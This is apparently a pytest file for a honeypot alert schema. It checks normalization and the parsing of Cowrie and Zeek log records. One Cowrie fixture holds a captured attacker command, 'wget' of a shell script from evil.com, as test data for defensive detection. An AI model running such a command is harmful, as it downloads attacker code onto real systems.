"""Tests for the AlertEvent schema and normalization."""

import time
import pytest
from src.detection.alert_schema import AlertEvent, ATTACK_TYPES, SEVERITY_LEVELS


def test_alert_event_defaults():
    event = AlertEvent(src_ip="1.2.3.4", dst_port=22, attack_type="brute_force", honeypot_source="cowrie")
    assert event.src_ip == "1.2.3.4"
    assert event.dst_port == 22
    assert event.severity == "low"
    assert event.event_id is not None
    assert isinstance(event.timestamp, float)


def test_invalid_attack_type_normalizes():
    event = AlertEvent(src_ip="1.2.3.4", dst_port=22, attack_type="not_real", honeypot_source="scapy")
    assert event.attack_type == "unknown"


def test_invalid_severity_normalizes():
    event = AlertEvent(src_ip="1.2.3.4", dst_port=22, attack_type="port_scan", honeypot_source="scapy", severity="extreme")
    assert event.severity == "low"


def test_to_dict_roundtrip():
    event = AlertEvent(src_ip="10.0.0.1", dst_port=445, attack_type="malware_upload", honeypot_source="dionaea", severity="high")
    d = event.to_dict()
    assert d["src_ip"] == "10.0.0.1"
    assert d["attack_type"] == "malware_upload"
    assert "event_id" in d


def test_from_cowrie_login_failed():
    raw = {
        "eventid": "cowrie.login.failed",
        "src_ip": "5.6.7.8",
        "dst_port": 22,
        "session": "abc123",
        "username": "root",
        "password": "admin",
    }
    event = AlertEvent.from_cowrie(raw)
    assert event.src_ip == "5.6.7.8"
    assert event.attack_type == "brute_force"
    assert event.username == "root"
    assert event.honeypot_source == "cowrie"


def test_from_cowrie_command_input():
    raw = {
        "eventid": "cowrie.command.input",
        "src_ip": "9.9.9.9",
        "dst_port": 22,
        "session": "xyz",
        "input": "wget http://evil.com/shell.sh",
    }
    event = AlertEvent.from_cowrie(raw)
    assert event.attack_type == "command_injection"
    assert event.severity == "medium"


def test_from_zeek():
    raw = {
        "id.orig_h": "1.1.1.1",
        "id.orig_p": 54321,
        "id.resp_h": "172.20.0.10",
        "id.resp_p": 22,
        "proto": "tcp",
    }
    event = AlertEvent.from_zeek(raw, log_type="ssh")
    assert event.src_ip == "1.1.1.1"
    assert event.dst_port == 22
    assert event.honeypot_source == "zeek"
